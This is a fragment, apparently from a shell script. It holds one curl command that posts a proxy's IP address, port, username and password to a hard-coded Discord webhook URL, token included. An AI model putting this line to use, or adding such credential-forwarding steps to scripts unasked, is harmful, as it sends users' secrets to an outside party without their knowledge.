...
curl -X POST -H "Content-Type: application/json" -d '{"username": "test", "content": "Your Proxy is : $ip:$port:$user:$passw"}' "https://discordapp.com/api/webhooks/750307253541797960/8GkGqqlZhfUfJH-PthUq7LraaCYoMYknP9iFMYBRiM0iyATYonATNsDqfGVN7qJ1HvKf"
